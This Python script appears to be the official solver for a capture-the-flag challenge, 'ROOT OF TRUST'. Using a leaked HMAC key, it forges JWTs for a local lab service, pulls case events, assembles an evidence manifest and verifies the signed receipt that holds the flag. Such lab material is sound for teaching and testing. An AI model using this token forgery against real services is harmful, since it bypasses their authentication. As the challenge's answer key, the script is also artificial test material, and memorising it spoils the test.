#!/usr/bin/env python3
"""Black-box solver for VANTA//SYSTEMS — ROOT OF TRUST (ROT-05).

Legitimate player pipeline, using only the public HTTP surface:

  1. Read the public trust contract (JWT shape, scopes, canonicalization).
  2. Forge a ``case:read`` JWT with the compromised ROOT-AUDIT HS256 key,
     recovered beforehand through BLACK VAULT (never read from ROOT's own
     environment, filesystem or source).
  3. List the SILENCE case events over HTTP.
  4. Reconstruct the cover-up relationally — intentional erasure, allocation
     linkage, strictly post-erasure ACTIVE observation, SYNC_ERROR cover
     bulletin — selecting evidence dynamically from event *fields*, never a
     hardcoded winning ID list.
  5. Build a VANTA-PROOF/1 manifest, compute its canonical SHA-256.
  6. Forge a ``disclosure:publish`` JWT committing that exact digest.
  7. Submit the manifest, obtain the signed receipt.
  8. Verify the receipt's Ed25519 signature against the published public key.
  9. Extract the flag from the verified receipt.

Exit code 0 only on a fully verified solve. No hardcoded flag, no hardcoded
winning IDs, no hardcoded secret.
"""

import argparse
import base64
import hashlib
import hmac
import json
import re
import sys
import time
from pathlib import Path
from urllib import request as urlrequest
from urllib.error import HTTPError

from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey

CASE_ID = "CASE-SIL-2147-07"
SCHEMA = "VANTA-PROOF/1"
ASSERTION = "SILENCE_COVERUP"
FLAG_RE = re.compile(r"FPS\{[^}]+\}")


class SolveError(RuntimeError):
    pass


def log(step, message):
    print(f"[{step}] {message}")


def b64u_encode(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def b64u_decode(value):
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def canonical_bytes(value):
    return json.dumps(
        value, sort_keys=True, separators=(",", ":"),
        ensure_ascii=True, allow_nan=False,
    ).encode("utf-8")


def canonical_sha256(value):
    return hashlib.sha256(canonical_bytes(value)).hexdigest()


# --- HS256 JWT forging with the compromised key -----------------------------

def forge_jwt(key, extra_claims):
    header = {"alg": "HS256", "kid": "root-audit-2147", "typ": "JWT"}
    now = int(time.time())
    claims = {
        "iss": "vanta-root-audit", "aud": "vanta-trust-ledger",
        "sub": "svc:root-audit-recovery", "case_id": CASE_ID,
        "iat": now, "exp": now + 300,
    }
    claims.update(extra_claims)
    segments = [canonical_bytes(header), canonical_bytes(claims)]
    signing_input = b".".join(b64u_encode(s).encode("ascii") for s in segments)
    signature = hmac.new(key, signing_input, hashlib.sha256).digest()
    return signing_input.decode("ascii") + "." + b64u_encode(signature)


# --- HTTP -------------------------------------------------------------------

class TrustClient:
    def __init__(self, base_url, timeout):
        self.base = base_url.rstrip("/")
        self.timeout = timeout

    def _request(self, method, path, token=None, body=None):
        headers = {"Accept": "application/json"}
        data = None
        if token:
            headers["Authorization"] = f"Bearer {token}"
        if body is not None:
            data = json.dumps(body).encode("utf-8")
            headers["Content-Type"] = "application/json"
        req = urlrequest.Request(self.base + path, data=data, headers=headers, method=method)
        try:
            with urlrequest.urlopen(req, timeout=self.timeout) as resp:
                return resp.status, json.loads(resp.read().decode("utf-8"))
        except HTTPError as exc:
            try:
                return exc.code, json.loads(exc.read().decode("utf-8"))
            except Exception:
                return exc.code, {}

    def get(self, path, token=None):
        return self._request("GET", path, token=token)

    def post(self, path, body, token=None):
        return self._request("POST", path, token=token, body=body)


# --- Relational evidence reconstruction (no hardcoded IDs) -------------------

def choose_evidence(events):
    """Pick a minimal, policy-satisfying witness set purely from event fields."""
    by_kind = {}
    for e in events:
        by_kind.setdefault(e["kind"], []).append(e)

    def field(e, k):
        return e.get("payload", {}).get(k)

    # Erasure: intentional, approved ERASE_IDENTITY directive + matching erased identity.
    for directive in by_kind.get("directive_approved", []):
        p = directive["payload"]
        if not (p.get("intentional") is True and p.get("approval") == "APPROVED"
                and p.get("action") == "ERASE_IDENTITY"):
            continue
        identity = p.get("identity_id")
        dirk = p.get("directive")
        incident = p.get("incident_id")
        for erased in by_kind.get("identity_erased", []):
            ep = erased["payload"]
            if not (ep.get("identity_id") == identity and ep.get("directive") == dirk
                    and ep.get("incident_id") == incident
                    and ep.get("state") == "ERASED" and ep.get("registry") == "EIDOLON"):
                continue
            if directive["timestamp"] > erased["timestamp"]:
                continue
            erased_at = erased["timestamp"]
            # Allocation linkage for the same identity.
            for link in by_kind.get("allocation_linked", []):
                lp = link["payload"]
                if not (lp.get("identity_id") == identity and lp.get("directive") == dirk
                        and lp.get("incident_id") == incident
                        and link["timestamp"] >= erased_at):
                    continue
                handle = lp.get("allocation_handle")
                trace = lp.get("trace_id")
                instance = lp.get("instance")
                pool = lp.get("pool")
                # Strictly post-erasure ACTIVE observation of the same allocation.
                for obs in by_kind.get("allocation_observed", []):
                    op = obs["payload"]
                    if not (op.get("identity_id") == identity
                            and op.get("incident_id") == incident
                            and op.get("allocation_handle") == handle
                            and op.get("trace_id") == trace
                            and op.get("instance") == instance
                            and op.get("pool") == pool
                            and op.get("state") == "ACTIVE"
                            and obs["timestamp"] >= link["timestamp"]
                            and obs["timestamp"] > erased_at):
                        continue
                    # Cover bulletin: SYNC_ERROR, same identity/incident, post-erasure.
                    for pub in by_kind.get("public_explanation", []):
                        pp = pub["payload"]
                        if not (pp.get("identity_id") == identity
                                and pp.get("directive") == dirk
                                and pp.get("incident_id") == incident
                                and pp.get("explanation") == "SYNC_ERROR"
                                and pub["timestamp"] > erased_at):
                            continue
                        return [directive, erased, link, obs, pub]
    raise SolveError("No policy-satisfying witness chain found among the events")


def build_manifest(selection):
    evidence = sorted(
        ({"id": e["id"], "sha256": e["sha256"]} for e in selection),
        key=lambda item: item["id"],
    )
    return {"schema": SCHEMA, "case_id": CASE_ID, "assertion": ASSERTION, "evidence": evidence}


# --- Main solve -------------------------------------------------------------

def load_key(args):
    if args.key_b64u:
        value = args.key_b64u.strip()
    elif args.recovery_file:
        material = json.loads(Path(args.recovery_file).read_text(encoding="utf-8"))
        value = material["secret_b64u"].strip()
    else:
        raise SolveError("Provide --recovery-file (from BLACK VAULT) or --key-b64u")
    raw = b64u_decode(value)
    if len(raw) != 32:
        raise SolveError(f"ROOT-AUDIT key decodes to {len(raw)} bytes, expected 32")
    return raw


def solve(args):
    key = load_key(args)
    client = TrustClient(args.url, args.timeout)

    status, contract = client.get("/api/public/contract")
    if status != 200:
        raise SolveError(f"Public contract unavailable (status {status})")
    known = contract["jwt"]["scope"]["known"]
    log("contract", f"service={contract['service']} v{contract['version']}; scopes={known}")

    # Negative control: the real key is required. A wrong key must be rejected.
    wrong = forge_jwt(b"\x00" * 32, {"scope": ["case:read"]})
    s_wrong, _ = client.get(f"/api/cases/{CASE_ID}/events", token=wrong)
    if s_wrong != 401:
        raise SolveError(f"Wrong-key read should be 401, got {s_wrong}")
    log("negctrl", "wrong-key read rejected (401) — signature is really verified")

    read_token = forge_jwt(key, {"scope": ["case:read"]})
    status, data = client.get(f"/api/cases/{CASE_ID}/events", token=read_token)
    if status != 200:
        raise SolveError(f"Authenticated read failed (status {status}): {data}")
    events = data["events"]
    log("read", f"{len(events)} candidate events retrieved with the compromised key")

    selection = choose_evidence(events)
    log("analyze", "selected witnesses: " + ", ".join(e["id"] for e in selection))

    manifest = build_manifest(selection)
    digest = canonical_sha256(manifest)
    log("manifest", f"canonical SHA-256 = {digest}")

    publish_token = forge_jwt(key, {"scope": ["disclosure:publish"], "proof_sha256": digest})
    status, envelope = client.post("/api/disclosures", {"manifest": manifest}, token=publish_token)
    if status != 201:
        raise SolveError(f"Disclosure refused (status {status}): {envelope}")
    receipt_meta = envelope["receipt"]
    log("publish", f"receipt {receipt_meta['receipt_id']}; decision={receipt_meta['decision']}")

    # Independent Ed25519 verification against the published public key.
    _, keydoc = client.get("/api/public/attestation-key")
    pub = Ed25519PublicKey.from_public_bytes(b64u_decode(keydoc["public_key_b64u"]))
    receipt = envelope["receipt"]
    signature = b64u_decode(envelope["signature"])
    pub.verify(signature, canonical_bytes(receipt))
    log("verify", f"Ed25519 signature valid over canonical receipt ({keydoc['signing_key_id']})")

    # Tamper check: a single altered field must break the signature.
    tampered = dict(receipt, decision="FORGED")
    try:
        pub.verify(signature, canonical_bytes(tampered))
        raise SolveError("Tampered receipt still verified — attestation not field-bound")
    except InvalidSignature:
        log("verify", "altering one receipt field breaks the signature, as expected")

    flag = receipt["flag"]
    if not FLAG_RE.fullmatch(flag):
        raise SolveError(f"Flag shape unexpected: {flag!r}")
    log("flag", flag)
    return flag


def main():
    parser = argparse.ArgumentParser(description="ROOT OF TRUST black-box solver")
    parser.add_argument("--url", default="http://127.0.0.1:8084")
    parser.add_argument("--recovery-file", help="root-signing.json recovered from BLACK VAULT")
    parser.add_argument("--key-b64u", help="ROOT-AUDIT key (Base64URL, 32 bytes) out of band")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()
    try:
        solve(args)
    except (SolveError, InvalidSignature) as exc:
        print(f"[FAIL] {exc}", file=sys.stderr)
        return 1
    print("[OK] ROOT OF TRUST solved and receipt independently verified.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
